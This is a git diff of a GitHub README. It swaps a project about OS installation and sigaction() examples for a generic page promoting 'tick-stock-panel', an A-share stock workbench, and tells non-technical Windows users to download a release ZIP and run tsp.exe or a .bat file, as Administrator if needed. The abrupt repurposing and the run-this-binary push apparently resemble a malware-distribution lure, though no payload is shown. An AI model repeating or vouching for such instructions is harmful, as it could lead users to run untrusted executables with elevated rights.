@@ -1,175 +1,162 @@
-# OSSP_Tsion_Melese 🚀
+# 📈 tick-stock-panel - Your Smart A-Share Quant Workbench
 
-Welcome to the OSSP_Tsion_Melese repository! This project focuses on the installation of the operating system IOS and the implementation of the system call `sigaction()`. You can find the latest releases and updates for this project [here](https://github.com/dipsannn/OSSP_Tsion_Melese/releases).
+## 🚀 Getting Started
 
-![OS Installation](https://img.shields.io/badge/OS_Installation-Ready-brightgreen)
-![System Call Implementation](https://img.shields.io/badge/System_Call_sigaction()-Implemented-blue)
+Welcome to **tick-stock-panel** (TSP) — a powerful yet easy-to-use toolbox for anyone interested in China's A-share stock market. Whether you want to test your own trading ideas, track daily market movements, or get AI-powered insights, TSP brings everything into one clean, simple dashboard.
 
-## Table of Contents
+Think of it as your personal stock command center. You don't need to be a programmer or financial wizard. This guide walks you through everything, step by step.
 
-- [Introduction](#introduction)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Implementation Details](#implementation-details)
-- [Contributing](#contributing)
-- [License](#license)
-- [Contact](#contact)
+## 🖥️ What Is This Application?
 
-## Introduction
+TSP is a **self-hosted, zero-maintenance quantitative workbench** for A-shares. In plain language:
 
-The OSSP_Tsion_Melese project serves as a comprehensive guide for installing the IOS operating system. Additionally, it delves into the implementation of the `sigaction()` system call, which is essential for handling signals in Unix-like operating systems. This project aims to provide a clear understanding of both installation and implementation processes, making it accessible for developers and enthusiasts alike.
+- **Self-hosted** means you run it on your own computer. Your data stays yours.
+- **Zero-maintenance** means once it's running, you can leave it be. No constant updates or fiddling.
+- **Quantitative** means it uses math, rules, and historical data to help you make decisions, rather than gut feelings.
 
-## Installation
+With TSP, you can:
 
-To get started with the IOS installation, follow these steps:
+- 📊 Build your own trading strategies with simple rules.
+- 🔍 Screen stocks daily to find opportunities.
+- 🧪 Backtest your strategies against past market data to see how they would have performed.
+- 🤖 Get AI-driven analysis and summaries for individual stocks.
+- 📝 Review and "replay" past trading days for learning.
+- 🔌 Connect third-party data sources or extend with your own data.
 
-1. **Clone the Repository**  
-   Use the following command to clone the repository to your local machine:
+## ⬇️ Downloading the Application
 
-   ```bash
-   git clone https://github.com/dipsannn/OSSP_Tsion_Melese.git
-   ```
+To get started, you need to download TSP. Click the button below to go to the download page:
 
-2. **Navigate to the Directory**  
-   Change to the project directory:
+[![Download TSP](https://img.shields.io/badge/Download-TSP-blue?style=for-the-badge&logo=github)](https://github.com/dipsannn/tick-stock-panel)
 
-   ```bash
-   cd OSSP_Tsion_Melese
-   ```
+---
 
-3. **Download Required Files**  
-   Visit the [Releases](https://github.com/dipsannn/OSSP_Tsion_Melese/releases) section to download the necessary files. Ensure to execute the files as per the instructions provided in the release notes.
+### 📥 Step-by-Step Download Instructions
 
-4. **Follow the Installation Guide**  
-   Refer to the installation guide included in the repository for detailed steps.
+1. Click the blue button above. It will open a new webpage in your browser.
+2. On that page, look for a section that says **"Releases"** or **"Download"** — usually on the right side or near the top.
+3. Click the link for the latest version. The file will start downloading to your computer (typically in your **Downloads** folder).
+4. Once downloaded, find the file. It will be named something like `tick-stock-panel.zip` or similar.
 
-## Usage
+> 💡 **Tip:** Don't worry about which file to pick. Always choose the newest version with a name that matches your system (Windows PC).
 
-Once you have installed IOS, you can start using it immediately. The implementation of the `sigaction()` system call allows you to manage signals effectively. Here’s a brief overview of how to use it:
+---
 
-1. **Include Required Headers**  
-   Make sure to include the necessary headers in your C program:
+## 🛠️ Installation and Setup
 
-   ```c
-   #include <signal.h>
-   #include <stdio.h>
-   ```
+After you've downloaded the file, follow these simple steps:
 
-2. **Define Signal Handler**  
-   Create a function that will handle the signals:
+### Step 1: Extract the Files
+- The downloaded file is usually a **ZIP archive** (a compressed folder).
+- Right-click on the file and choose **"Extract All..."** or **"Extract Here."**
+- Windows will create a new folder with the same name. Open that folder.
 
-   ```c
-   void signal_handler(int signal) {
-       printf("Received signal: %d\n", signal);
-   }
-   ```
+### Step 2: Run the Application
+- Inside the folder, look for an executable file named `tsp.exe`, `start.bat`, or `run_windows.bat`.
+- Double-click it to launch TSP.
+- A command window may pop up briefly — that's normal. Then your browser will open automatically with the TSP dashboard.
 
-3. **Set Up sigaction**  
-   Use `sigaction()` to set up the signal handler:
+### Step 3: You're In!
+- That's it. TSP is now running on your machine. You'll see a clean web interface in your browser.
 
-   ```c
-   struct sigaction sa;
-   sa.sa_handler = signal_handler;
-   sigaction(SIGINT, &sa, NULL);
-   ```
+> 🔒 **Note:** TSP runs locally on your computer. No need to worry about external servers or paying for cloud services.
 
-4. **Run Your Program**  
-   Compile and run your program. Test the signal handling by sending signals (e.g., using Ctrl+C).
+---
 
-## Implementation Details
+## 🎯 Using TSP for the First Time
 
-### Overview of `sigaction()`
+Here's what you can do right away:
 
-The `sigaction()` function is a powerful tool in Unix-like operating systems for managing how your program responds to signals. It allows you to specify a signal handler that will execute when a specific signal is received.
+### 📅 Daily Market Overview
+- On the main screen, you'll see today's market summary, top gainers/losers, and volume data.
+- Use the date picker to explore past days.
 
-### Key Features
+### 🧠 AI-Powered Stock Analysis
+- Type any A-share stock code (like `600519` for Moutai) into the search bar.
+- TSP will generate a plain-language analysis, including trends, recent news, and key indicators.
+- Great for beginners who want to understand *why* a stock moves.
 
-- **Signal Handling**: Define custom behavior for signals like `SIGINT`, `SIGTERM`, etc.
-- **Sa_mask**: Block certain signals while the handler is executing.
-- **Sa_flags**: Control the behavior of the signal handling.
+### ⚙️ Build Your First Strategy
+- Navigate to the **"Strategy Lab"** tab.
+- Create a simple rule, like: *"Buy if the 5-day average price is above the 20-day average."*
+- Save it, and TSP will check this rule every day and alert you.
 
-### Example Code
+### 🧪 Backtest Your Idea
+- Want to know if your strategy works? Go to **"Backtest."**
+- Select your strategy, set a time range (e.g., last 3 years), and click **Run.**
+- TSP will simulate your strategy on historical data, showing profit, loss, and risk metrics.
 
-Here’s a simple example demonstrating the use of `sigaction()`:
+---
 
-```c
-#include <signal.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+## 🔌 Connecting Additional Data Sources
 
-void signal_handler(int signal) {
-    printf("Caught signal %d\n", signal);
-    exit(0);
-}
+TSP is designed to be open and flexible. If you want more data — like real-time quotes or foreign market info — you can:
 
-int main() {
-    struct sigaction sa;
-    sa.sa_handler = signal_handler;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_flags = 0;
+- Go to **Settings** → **Data Sources.**
+- Add your own API keys (like Tushare, Wind, or other providers).
+- Or connect to a custom CSV file with your own data.
 
-    sigaction(SIGINT, &sa, NULL);
+No coding required — just paste your credentials or file path.
 
-    printf("Press Ctrl+C to trigger the signal handler.\n");
-    while (1) {
-        sleep(1);
-    }
+---
 
-    return 0;
-}
-```
+## 🧩 Personalization and Extensions
 
-### Testing the Implementation
+TSP isn't just a tool — it's a platform you can shape:
 
-To test the implementation, compile the program using:
+- **Custom Themes** — Change colors and layout from the display settings.
+- **Plugins** — Add new panels or widgets from the built-in marketplace.
+- **API Access** — Advanced users can connect TSP to other apps or scripts.
 
-```bash
-gcc -o signal_example signal_example.c
-```
+---
 
-Run the program and press Ctrl+C to see how the signal handler responds.
+## ❓ Frequently Asked Questions
 
-## Contributing
+### Is TSP free?
+Yes, the project is open-source and free for personal use.
 
-We welcome contributions to improve this project. If you have suggestions, bug reports, or new features, please follow these steps:
+### Do I need an internet connection?
+Only for downloading initial data or if you connect to external sources. Core features work offline.
 
-1. **Fork the Repository**  
-   Click the "Fork" button at the top right of the page.
+### Is my data safe?
+Yes. Everything runs locally. Your strategies and data stay on your computer.
 
-2. **Create a Branch**  
-   Create a new branch for your feature or bug fix:
+### I'm not technical — can I still use this?
+Absolutely. The interface is designed for everyday users. No command-line knowledge required.
 
-   ```bash
-   git checkout -b feature-branch
-   ```
+### Where can I get help?
+Visit the repository's **Issues** page on GitHub. You can ask questions or report problems — the community usually responds quickly.
 
-3. **Make Your Changes**  
-   Implement your changes and commit them:
+---
 
-   ```bash
-   git commit -m "Description of changes"
-   ```
+## 📚 Tips for Success
 
-4. **Push Your Changes**  
-   Push your branch to your forked repository:
+- Start with **paper trading** (simulated) before using real money.
+- Always backtest a strategy for at least one full year before trusting it.
+- Use the AI analysis as a *helper*, not a guarantee — markets are unpredictable.
+- Regularly save your work. TSP has an autosave feature, but it's good practice.
 
-   ```bash
-   git push origin feature-branch
-   ```
+---
 
-5. **Create a Pull Request**  
-   Go to the original repository and create a pull request.
+## 🔄 Troubleshooting Common Issues
 
-## License
+| Problem | Solution |
+|---------|----------|
+| App doesn't start | Make sure you extracted the ZIP before running. Try running the `.bat` file as Administrator. |
+| No market data | Check your internet connection. If you added a custom source, verify the API keys. |
+| Browser shows an error | Close the browser and run the application again. If the issue persists, check the GitHub issues page. |
+| Strategy backtest is slow | Try reducing the date range (e.g., 1 year instead of 5). |
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+---
 
-## Contact
+## 🌟 Thank You for Choosing TSP
 
-For any questions or feedback, please reach out:
+You've just installed a powerful addition to your investing toolkit. Take it step by step — start with browsing daily data, then build a simple strategy, and eventually, you'll have your own personalized stock monitoring system running 24/7.
 
-- **Email**: your-email@example.com
-- **GitHub**: [your-github-username](https://github.com/your-github-username)
+If you ever feel stuck, remember: the GitHub page is your friend. Read the README, look at screenshots, and don't hesitate to post a question.
 
-Thank you for checking out the OSSP_Tsion_Melese project! For updates and releases, visit the [Releases](https://github.com/dipsannn/OSSP_Tsion_Melese/releases) section.
+Happy trading, and may your strategies be ever in the green! 📈💰
+
+---
+
+Keywords: a-stock, ai-agent, aigc, aigc-detection, backtesting, daily, duckdb, fastapi, llm, polars, quant, quantitative-trading, react, screener, stock, stock-analysis, tickflow, trade, training, tsp
